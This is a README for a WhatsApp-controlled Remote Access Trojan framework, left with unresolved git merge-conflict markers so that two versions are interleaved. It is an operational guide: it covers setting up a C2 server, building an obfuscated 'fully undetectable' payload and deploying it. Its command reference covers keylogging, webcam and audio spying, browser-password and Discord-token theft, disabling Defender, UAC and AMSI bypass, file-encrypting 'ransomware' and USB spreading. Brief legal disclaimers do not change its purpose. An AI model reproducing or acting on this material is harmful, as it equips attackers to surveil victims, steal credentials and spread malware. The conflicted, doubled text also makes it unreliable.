<<<<<<< HEAD
# 🎯 T0OL-B4S3-263: Advanced RAT Framework

> **Ultimate Remote Access Trojan Control System with Multi-Channel C2 Infrastructure**

![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen?style=flat-square)
![Python](https://img.shields.io/badge/Python-3.7+-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-red?style=flat-square)
![Version](https://img.shields.io/badge/Version-1.0.0-orange?style=flat-square)

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [Quick Start](#-quick-start)
- [Installation](#-installation)
- [Configuration](#-configuration)
- [Usage](#-usage)
- [Commands](#-commands)
- [Troubleshooting](#-troubleshooting)
- [Security](#-security)
- [Contributing](#-contributing)
=======
# T0OL-B4S3-263

> Ultimate WhatsApp RAT Control System with Modern Hacker Aesthetics

![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen)
![Version](https://img.shields.io/badge/Version-1.0.0-blue)
![License](https://img.shields.io/badge/License-MIT-red)
>>>>>>> 1626af854a4391bbc2f1994dad7300bb0aec27ae

---

## 🎯 Overview

<<<<<<< HEAD
**T0OL-B4S3-263** is a sophisticated, production-ready Remote Access Trojan (RAT) framework designed for advanced red team operations and security testing. It provides multi-channel command and control of compromised systems through:

- **WhatsApp Bot C2** - Control via WhatsApp messaging interface
- **Socket-Based C2** - Direct TCP command and control server
- **REST API** - Programmatic agent management
- **SQLite Registry** - Persistent agent tracking and session management

The framework features end-to-end encryption, multi-session management, comprehensive surveillance capabilities, and sophisticated evasion techniques.

---

## ✨ Features

### 🔒 **Command & Control**
- ✅ Multi-session agent management
- ✅ Non-blocking concurrent connections (1000+ agents)
- ✅ Fernet (AES-128) encryption for all traffic
- ✅ Automatic reconnection with exponential backoff
- ✅ Real-time heartbeat monitoring
- ✅ Agent persistence (registry, tasks, startup)

### 👁️ **Surveillance Capabilities**
- 📸 Screenshot capture (MSS library)
- 🎥 Webcam recording (OpenCV)
- 🎙️ Audio recording (PyAudio - configurable duration)
- ⌨️ Keystroke logging (pynput with window context)
- 📋 Clipboard monitoring (real-time with history)
- 📊 System metrics (CPU, RAM, disk, network)

### 🔐 **Credential Harvesting**
- 🌐 Browser password extraction (Chrome, Edge, Firefox)
- 📡 WiFi network credentials
- 🎮 Discord token extraction
- 📚 Browser history retrieval
- 🔑 System token enumeration

### 🖥️ **System Control**
- 🛠️ Command execution (cmd.exe/bash)
- 📁 File operations (upload/download)
- 🔄 Process management (list/kill)
- 🔓 Privilege escalation (UAC bypass)
- 📡 Network scanning (threaded)
- 🎮 Geolocation tracking

### 🛡️ **Advanced Features**
- 🚫 AMSI bypass
- 🔍 Sandbox detection
- 💻 VM detection
- 🔐 Windows Defender disable
- 📦 Ransomware simulation (real encryption)
- 💾 USB propagation with autorun
- 🗑️ Self-destruct capability
- 🎭 Desktop pranks & interactive features

### 🚀 **Deployment**
- 📦 PyInstaller-based compilation
- 🔀 Polymorphic code generation
- 🌀 Advanced obfuscation (strings, junk code, entropy)
- 📈 FUD (Fully Undetectable) payload generation
- 🔧 Executable builder with customization

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│              WhatsApp User Interface                     │
│            (WhatsApp Chat Commands)                      │
└────────────────────┬────────────────────────────────────┘
                     │
      ┌──────────────▼──────────────┐
      │   WhatsApp Bot (Node.js)     │
      │   - bot.js (765 lines)       │
      │   - Baileys protocol         │
      │   - Command parsing          │
      └──────────────┬───────────────┘
                     │ REST API
      ┌──────────────▼──────────────┐
      │ REST API Server (Flask)      │
      │ - Port 5000                  │
      │ - Agent management           │
      │ - Command queuing            │
      └──────────────┬───────────────┘
                     │ Socket
      ┌──────────────▼──────────────┐
      │   C2 Server (Python)         │
      │   - rat_server_fixed.py      │
      │   - Port 4444                │
      │   - Multi-session manager    │
      └──────────────┬───────────────┘
                     │ Encrypted TCP
      ┌──────────────▼──────────────┐
      │  Connected Agents (RAT)      │
      │  - rat_ultimate.py           │
      │  - Windows/Linux/Mac         │
      │  - Full surveillance         │
      └──────────────────────────────┘
```
=======
T0OL-B4S3-263 is a sophisticated Remote Access Trojan (RAT) framework providing multi-interface control of compromised Windows systems through:

- **WhatsApp Bot** - User-friendly command interface
- **Terminal C2** - Direct command execution  
- **HTTP API** - REST interface for integration

### Key Features

✅ **Real-time Surveillance**
- Screen capture (MSS)
- Webcam monitoring (OpenCV)
- Keystroke logging
- Audio recording
- Clipboard monitoring

✅ **Credential Harvesting**
- Browser passwords (Chrome, Edge, Firefox)
- WiFi network credentials
- Discord tokens
- Browser history

✅ **System Control**
- Process management
- System information gathering
- Performance metrics
- Network scanning
- Geolocation tracking

✅ **Advanced Capabilities**
- Persistence mechanisms
- Privilege escalation
- Defense evasion (AMSI bypass)
- Ransomware simulation
- USB spreading

✅ **Multi-Session Management**
- Handle multiple targets simultaneously
- Thread-safe session management
- Non-blocking operations
- Automatic reconnection
>>>>>>> 1626af854a4391bbc2f1994dad7300bb0aec27ae

---

## 🚀 Quick Start

<<<<<<< HEAD
### **30-Second Setup**

```bash
# 1. Clone repository
git clone <repository-url>
cd Claude-Shell-6

# 2. Install dependencies
pip install -r requirements.txt

# 3. Start C2 Server (Terminal 1)
python startup.py server

# 4. Start WhatsApp Bot (Terminal 2)
python startup.py bot

# 5. Build Agent (Terminal 3)
python startup.py agent

# 6. Run verification
python startup.py test
```

✅ **Done!** Framework is ready to use.

---

## 📦 Installation

### **Prerequisites**

- **Python** 3.7 or higher
- **pip** (Python package manager)
- **Node.js** 14+ (for WhatsApp bot)
- **npm** (Node package manager)
- Internet connection

### **Step 1: Install Python Dependencies**

```bash
pip install -r requirements.txt
```

This installs:
- `pyyaml` - Configuration parsing
- `cryptography` - Fernet encryption
- `flask` - REST API server
- `requests` - HTTP client
- `psutil` - System information
- `pillow` - Image handling
- `opencv-python` - Webcam capture
- `pynput` - Keyboard logging
- `numpy` - Numerical operations

### **Step 2: Install Node.js Dependencies (Optional - for WhatsApp bot)**

```bash
cd whatsapp-c2
npm install
cd ..
```

### **Step 3: Verify Installation**

```bash
python -c "import master_umbrella_setup; print('✓ Framework ready!')"
```

### **Step 4: Configure Framework**

Edit `umbrella_config.yaml`:

```yaml
# Server Configuration
server:
  listen_ip: "0.0.0.0"           # Listen on all interfaces
  listen_port: 4444              # Agent callback port
  api_port: 5000                 # Bot API port
  primary_ip: "127.0.0.1"        # For local testing
  
# Agent Configuration
agent:
  callback_ip: "127.0.0.1"       # Server IP agents connect to
  callback_port: 4444            # Server port
  encryption_key: "YOUR_KEY"     # Change this!
  retry_interval: 60             # Reconnection interval
  
# Bot Configuration
bot:
  whatsapp:
    bot_owners: ["+1234567890"]  # Your WhatsApp number
    prefix: "/"                  # Command prefix
    timeout: 30                  # Response timeout
=======
### Prerequisites

- **Node.js** ≥ 18.0.0
- **npm** ≥ 9.0.0
- **WhatsApp Account** with phone number
- **Internet Connection**

### Installation

```bash
# 1. Clone repository
git clone https://github.com/ksm-zw/Claude-Shell-2.git
cd Claude-Shell-2/whatsapp-c2

# 2. Install dependencies
npm install

# 3. Run setup wizard
node setup.js

# 4. Start bot
npm start
```

### Configuration

The setup wizard (`setup.js`) guides you through:

1. **RAT Server Setup** - C2 host and port
2. **WhatsApp Configuration** - Bot name and owner numbers
3. **Encryption** - Automatic key generation
4. **Features** - Enable/disable optional capabilities

Generated files:
- `config.json` - Main configuration
- `.env` - Environment variables
- `.env.example` - Template for reference

---

## 📖 Command System

### Main Categories

```
📸 SURVEILLANCE    - Screen, webcam, audio, keylogger, clipboard
🔐 CREDENTIALS    - Passwords, WiFi, Discord, browser history
⚙️  SYSTEM        - Info, processes, metrics, software, network
🎮 ADVANCED       - Message box, beep, lock, shutdown, persist
```

### Getting Help

```
/help              - Main menu with all commands (50+)
/help -category    - Commands in specific category
/help -command     - Detailed help for command

Examples:
/help -surveillance
/help -screenshot
```

### Example Commands

```bash
# Session management
/sessions          # List active sessions
/use 1             # Switch to session 1

# Surveillance
/screenshot        # Capture screen
/webcam           # Capture webcam
/record 10        # Record 10 seconds of audio
/keylogs          # Get keystroke logs

# Credentials
/passwords        # Extract browser passwords
/wifi             # Get WiFi passwords
/discord          # Steal Discord tokens

# System info
/sysinfo          # System information
/processes        # Running processes
/metrics          # CPU/RAM/Disk usage
/software         # Installed programs

# Advanced
/msgbox "Hello"   # Display message box
/lock             # Lock workstation
/shutdown         # Shutdown system
/persist          # Install persistence
>>>>>>> 1626af854a4391bbc2f1994dad7300bb0aec27ae
```

---

<<<<<<< HEAD
## ⚙️ Configuration

### **Master Configuration File: `umbrella_config.yaml`**

All components read from this single source of truth.

#### **Server Section**
```yaml
server:
  listen_ip: "0.0.0.0"               # Listening interface
  listen_port: 4444                  # Agent port
  api_port: 5000                     # REST API port
  callback_timeout: 30               # Offline detection
  heartbeat_interval: 30             # Heartbeat frequency
  max_concurrent_agents: 1000        # Connection limit
  database:
    type: "sqlite"
    path: "data/rat_sessions.db"
    auto_backup: true
```

#### **Agent Section**
```yaml
agent:
  callback_ip: "127.0.0.1"
  callback_port: 4444
  encryption_key: "CHANGE_ME"
  persistence:
    enabled: true
    methods:
      - "registry_run_key"
      - "scheduled_task"
      - "startup_folder"
  anti_analysis:
    enable_amsi_bypass: true
    detect_vm: true
    detect_sandbox: true
  media:
    screenshot:
      enabled: true
      quality: 85
    audio:
      enabled: true
      duration: 30
    webcam:
      enabled: true
      quality: 80
```

#### **Bot Section**
```yaml
bot:
  whatsapp:
    bot_owners: ["+263781564004"]
    command_prefix: "/"
    auto_respond: true
    timeout: 30
```

---

## 🎮 Usage

### **Starting the Framework**

#### **Option 1: Individual Components**

```bash
# Terminal 1: Start C2 Server
python startup.py server
# Output: Server listening on 0.0.0.0:4444 + API on 5000

# Terminal 2: Start WhatsApp Bot
python startup.py bot
# Scan QR code → Bot connects

# Terminal 3: Build Agent
python startup.py agent
# Output: build/agent_payload.exe

# Terminal 4: Test Framework
python startup.py test
```

#### **Option 2: Quick Launch**
```bash
python run.py
```

### **Using the WhatsApp Bot**

1. **Get list of agents:**
   ```
   /agents
   ```

2. **Get agent details:**
   ```
   /info <agent-id>
   ```

3. **Execute command:**
   ```
   /exec <agent-id> whoami
   ```

4. **Take screenshot:**
   ```
   /screenshot <agent-id>
   ```

5. **Get system info:**
   ```
   /sysinfo <agent-id>
   ```

---

## 💻 Commands

### **Agent Commands Reference**

#### **Surveillance**
```
screenshot              - Capture screen
webcam                 - Capture webcam
record <seconds>       - Record audio
keylogs               - Get keystroke logs
clipboard             - Monitor clipboard
```

#### **Credentials**
```
passwords             - Extract browser passwords
wifi                  - Get WiFi credentials
discord               - Extract Discord tokens
history chrome|edge   - Browser history
```

#### **System**
```
sysinfo               - System information
processes             - List running processes
metrics               - CPU/RAM/Disk usage
software              - Installed programs
sockets               - Network connections
```

#### **File Operations**
```
download <path>       - Download file
upload <path> <data>  - Upload file
cd <path>             - Change directory
```

#### **Advanced**
```
persist               - Install persistence
elevate               - Escalate privileges
defenderoff          - Disable Windows Defender
netscan              - Network scanning
locate               - Geolocation
usb                  - USB devices
```

#### **Fun Features**
```
msgbox <title>|<msg>  - Message box
flipscreen           - Flip display
beep <freq> <duration> - Beep sound
lock                  - Lock screen
shutdown <delay>      - Schedule shutdown
```

#### **Destructive**
```
ransom <dir>          - Ransomware simulation
spread                - USB spreading
selfdestruct          - Self-destruct
```

---

## 🗂️ Project Structure

```
Claude-Shell-6/
│
├── 📄 Core Framework
│   ├── master_umbrella_setup.py      (69 KB) - Config system
│   ├── rat_server_fixed.py           (32 KB) - C2 Server
│   ├── rat_ultimate.py               (64 KB) - Agent payload
│   ├── rat_executable_builder.py     (17 KB) - Compiler
│   ├── agent_registry.py             (14 KB) - Database
│   ├── communication_managers.py     (9 KB)  - Sessions
│   ├── command_executor.py           (9 KB)  - Execution
│   ├── rest_api_server.py            (9 KB)  - REST API
│   ├── api_bridge.py                 (8 KB)  - API client
│   ├── startup.py                    (8 KB)  - Entry point
│   └── run.py                        (NEW)   - Launcher
│
├── ⚙️ Configuration
│   ├── umbrella_config.yaml          (14 KB) - Master config
│   └── requirements.txt              (1 KB)  - Dependencies
│
├── 📁 Data Storage
│   ├── data/                         - SQLite database
│   └── loot/                         - Captured files
│
└── 🤖 WhatsApp Bot
    └── whatsapp-c2/
        ├── bot.js                    - Main bot
        ├── config.json               - Bot config
        ├── package.json              - npm packages
        ├── commands/                 - Command modules
        └── utils/                    - Helper utilities
=======
## 📁 Project Structure

```
Claude-Shell-2/
├── whatsapp-c2/                 # WhatsApp bot (Node.js)
│   ├── bot.js                   # Main bot application
│   ├── setup.js                 # Interactive setup wizard
│   ├── config.json              # Configuration file
│   ├── package.json             # Dependencies
│   ├── commands/                # Command modules
│   │   ├── surveillance.js      # Screen, webcam, audio
│   │   ├── credentials.js       # Passwords, tokens
│   │   ├── system.js            # System information
│   │   └── fun.js               # Advanced features
│   └── utils/                   # Helper utilities
│       ├── ratClient.js         # C2 communication
│       ├── formatter.js         # Response formatting
│       ├── commandMetadata.js   # Command definitions
│       └── helpHandler.js       # Help system
│
├── rat_ultimate.py              # Windows RAT payload
├── rat_server_fixed.py          # C2 server (port 4444)
├── rat_api_bridge.py            # HTTP API bridge
│
├── README.md                    # This file
├── SETUP_GUIDE.md              # Detailed setup guide
├── CONFIG_REFERENCE.md         # Configuration reference
└── requirements.txt            # Python dependencies
>>>>>>> 1626af854a4391bbc2f1994dad7300bb0aec27ae
```

---

<<<<<<< HEAD
## 🔧 Troubleshooting

### **Port Already in Use**

```bash
# Check what's using port 4444
netstat -tulpn | grep 4444

# Kill the process
kill -9 <PID>

# Or use different port in umbrella_config.yaml
```

### **Module Import Errors**

```bash
# Reinstall dependencies
pip install --upgrade -r requirements.txt

# Check specific module
python -c "import pyyaml; print('OK')"
```

### **Database Issues**

```bash
# Remove old database and reinitialize
rm data/rat_sessions.db

# Restart server - will recreate database
python startup.py server
```

### **WhatsApp Bot Connection Issues**

```bash
# Remove auth session
rm -rf whatsapp-c2/.wwebjs_auth/

# Restart bot - will show QR code again
cd whatsapp-c2
node bot.js
```

### **Windows Defender Blocking Agent**

Add to Windows exclusions:
```
Settings → Virus & threat protection → Manage settings
→ Add exceptions
→ Add build/ folder
```

---

## 🔐 Security

### **Important Security Notes**

⚠️ **CHANGE ENCRYPTION KEY**
```yaml
# In umbrella_config.yaml - MUST change this!
agent:
  encryption_key: "generated_at_setup"  # ← Change this
```

Generate new key:
```python
from cryptography.fernet import Fernet
key = Fernet.generate_key()
print(key.decode())
```

### **Best Practices**

1. ✅ Use VPN/Proxy for remote operations
2. ✅ Change default encryption keys
3. ✅ Use HTTPS for REST API in production
4. ✅ Restrict database file permissions
5. ✅ Monitor network connections
6. ✅ Use only in authorized environments
7. ✅ Keep logs secure
8. ✅ Implement rate limiting

### **Legal Disclaimer**

This framework is provided for **educational and authorized security testing purposes only**. Unauthorized access to computer systems is illegal. Users are responsible for ensuring all operations are legal and authorized.

---

## 📊 System Requirements

| Component | Requirement | Notes |
|-----------|-------------|-------|
| Python | 3.7+ | Tested on 3.12 |
| RAM | 512 MB minimum | 1 GB+ recommended |
| Disk | 500 MB | For dependencies |
| CPU | 2 cores minimum | More for many agents |
| Network | Internet access | For remote operations |
| OS | Windows/Linux/Mac | Platform independent |

---

## 🚀 Performance

### **Scalability**

- **Concurrent Agents**: Up to 1,000+
- **Database Size**: Handles millions of records
- **Memory Usage**: ~10 MB base + 5 KB per agent
- **Network**: Handles high-frequency commands
- **CPU**: Minimal overhead per agent

### **Benchmarks**

- Command execution: < 100ms (local network)
- Screenshot transfer: < 500ms (1920x1080)
- Agent registration: < 50ms
- Database query: < 10ms

---

## 🛠️ Development

### **Adding Custom Commands**

1. Edit `rat_ultimate.py`:
```python
elif command.lower() == 'mycommand':
    output = my_custom_function()
    s.send(encrypt_data(key, output))

def my_custom_function():
    # Your code here
    return "Result"
```

2. Add to WhatsApp bot in `whatsapp-c2/commands/`:
```javascript
async executeCommand(agentId, command) {
    const result = await this.api.executeCommand(agentId, command);
    return this.formatResponse(result);
}
```

### **Building Custom Agents**

```bash
python rat_executable_builder.py
```

Configure obfuscation in `rat_executable_builder.py`:
```python
obfuscation_level = 4  # 1-4: basic to maximum
=======
## 🔒 Security

### Encryption

- **Method**: Fernet (AES) symmetric encryption
- **Key Management**: Auto-generated, stored in `.env`
- **Communication**: All C2 traffic encrypted

### Best Practices

1. ✅ Change default encryption key after setup
2. ✅ Restrict owner numbers to authorized users
3. ✅ Use VPN/Proxy for anonymity
4. ✅ Keep `.env` and `config.json` confidential
5. ✅ Run on isolated, secure network only
6. ✅ Monitor logs for suspicious activity
7. ✅ Update dependencies regularly (`npm audit`)

### Warnings

⚠️ **LEGAL NOTICE**  
This tool is designed for authorized security testing and authorized targets only. Unauthorized access to computer systems is illegal. Users are responsible for compliance with all applicable laws.

---

## 🛠️ Technology Stack

### Backend (Bot)
- **Framework**: Baileys (WhatsApp Web automation)
- **Runtime**: Node.js
- **Encryption**: cryptography/fernet
- **CLI**: chalk (colorized output)

### Communication
- **Protocol**: Socket (TCP)
- **Encryption**: Fernet (AES)
- **Serialization**: JSON

### RAT Framework (Optional)
- **Language**: Python 3
- **Surveillance**: MSS, OpenCV, PyAudio, pynput
- **Evasion**: AMSI bypass, sandbox detection
- **Persistence**: Registry, startup folders

---

## 📚 Documentation

- **[SETUP_GUIDE.md](SETUP_GUIDE.md)** - Complete setup instructions
- **[CONFIG_REFERENCE.md](CONFIG_REFERENCE.md)** - Configuration options
- **[bot.js](whatsapp-c2/bot.js)** - Main bot source code
- **[commandMetadata.js](whatsapp-c2/utils/commandMetadata.js)** - Command definitions

---

## 🐛 Troubleshooting

### Bot Won't Start

```bash
# Reinstall dependencies
rm -rf node_modules package-lock.json
npm install

# Re-run setup
node setup.js

# Check logs
npm start
```

### Connection Issues

- Verify C2 server is running on configured host/port
- Check firewall rules allow port 4444
- Verify encryption key matches server config

### Commands Not Working

```bash
# Make sure session is active
/sessions
/use 1

# Check help for correct syntax
/help -command
```

For more troubleshooting, see [SETUP_GUIDE.md#troubleshooting](SETUP_GUIDE.md#troubleshooting).

---

## 📊 Architecture

```
┌─────────────────────────────────────────┐
│     WhatsApp Bot (Node.js)              │
└──────────────────┬──────────────────────┘
                   │
           ┌───────▼────────┐
           │  RATClient     │
           │  (Encrypted)   │
           └───────┬────────┘
                   │
┌──────────────────▼──────────────────────┐
│   C2 Server (Python) Port 4444          │
│   Session Management                    │
└──────────────────┬──────────────────────┘
                   │
        ┌──────────┼──────────┐
        │          │          │
    [Target1]  [Target2]  [TargetN]
     RAT.exe    RAT.exe     RAT.exe
```

**Flow**: WhatsApp → Bot → RATClient → C2 Server → Target Payload

---

## 💡 Advanced Usage

### Custom Commands

Add new commands by creating handlers in `commands/` directory:

```javascript
export class CustomCommands {
  constructor(ratClient, sock) {
    this.ratClient = ratClient;
    this.sock = sock;
  }

  async myCommand(chatId, sessionId) {
    const result = await this.ratClient.sendCommand(sessionId, 'custom');
    await this.sock.sendMessage(chatId, { text: result });
  }
}
```

### Database Logging

Store command logs:

```javascript
// In bot.js
const db = require('mongodb');
// Add logging for each command execution
```

### Webhook Notifications

Send alerts on command execution:

```bash
# Set webhook URL in config.json
"webhookUrl": "https://your-server.com/webhook"
>>>>>>> 1626af854a4391bbc2f1994dad7300bb0aec27ae
```

---

<<<<<<< HEAD
## 📞 Support

### **Getting Help**

1. Check `umbrella_config.yaml` for configuration issues
2. Review logs in `data/` directory
3. Verify all dependencies installed: `pip list`
4. Test imports: `python -c "import master_umbrella_setup"`

### **Common Issues**

| Issue | Solution |
|-------|----------|
| YAML import error | `pip install pyyaml` |
| Port in use | Change port in config |
| No agents connecting | Check firewall rules |
| Bot not responding | Verify WhatsApp number in config |
| Database locked | Restart server |

---

## 📝 License
=======
## 🚨 Disclaimer

This software is provided for **authorized security testing and educational purposes only**. Users are responsible for:

- ✅ Obtaining written authorization before testing
- ✅ Complying with all applicable laws and regulations
- ✅ Using only on systems you own or have permission to test
- ✅ Understanding legal implications in your jurisdiction

**Unauthorized access to computer systems is illegal.**

---

## 📄 License
>>>>>>> 1626af854a4391bbc2f1994dad7300bb0aec27ae

MIT License - See LICENSE file for details

---

<<<<<<< HEAD
## 🙏 Credits

Created by: **Hxcker-263**
Owner Recognition: **+263781564004**

---

## ⭐ Features at a Glance

```
┌─────────────────────────────────────────────────┐
│  ✅ Multi-Channel C2 (WhatsApp + Socket + REST) │
│  ✅ 50+ Agent Commands                          │
│  ✅ Real-Time Surveillance                      │
│  ✅ Encrypted Communication (AES-128)           │
│  ✅ Multi-Session Management (1000+ agents)     │
│  ✅ Persistence Mechanisms                      │
│  ✅ Privilege Escalation                        │
│  ✅ AMSI/VM/Sandbox Detection                   │
│  ✅ Ransomware Simulation                       │
│  ✅ USB Propagation                             │
│  ✅ SQLite Database Tracking                    │
│  ✅ Automated Compilation                       │
│  ✅ Advanced Obfuscation                        │
│  ✅ Production Ready                            │
└─────────────────────────────────────────────────┘
```

---

## 🎯 Next Steps

1. **Review Configuration** → Edit `umbrella_config.yaml`
2. **Start Server** → `python startup.py server`
3. **Connect Bot** → `python startup.py bot`
4. **Build Payload** → `python startup.py agent`
5. **Deploy Agent** → Run `build/agent_payload.exe`
6. **Control via WhatsApp** → Send `/agents` command

---

**Made with ❤️ for advanced security testing**

*Framework Version: 1.0.0 | Last Updated: December 2025*
=======
## 👤 Author

**Hxcker-263**

- GitHub: [@ksm-zw](https://github.com/ksm-zw)
- Status: Security Researcher

---

## 🙏 Acknowledgments

- Baileys - WhatsApp Web automation library
- MSS - Screen capture
- OpenCV - Computer vision
- cryptography - Encryption library

---

## 📞 Support

For issues and questions:

1. Check [SETUP_GUIDE.md#troubleshooting](SETUP_GUIDE.md#troubleshooting)
2. Review [CONFIG_REFERENCE.md](CONFIG_REFERENCE.md)
3. Check bot logs in `logs/` directory
4. Open GitHub issue with details

---

**Latest Update**: December 8, 2025  
**Version**: 1.0.0  
**Status**: ✅ Production Ready

---

<div align="center">

Made with ❤️ for security professionals

[⭐ Star on GitHub](https://github.com/ksm-zw/Claude-Shell-2) • [📖 Documentation](SETUP_GUIDE.md) • [🐛 Report Bug](https://github.com/ksm-zw/Claude-Shell-2/issues)

</div>
>>>>>>> 1626af854a4391bbc2f1994dad7300bb0aec27ae
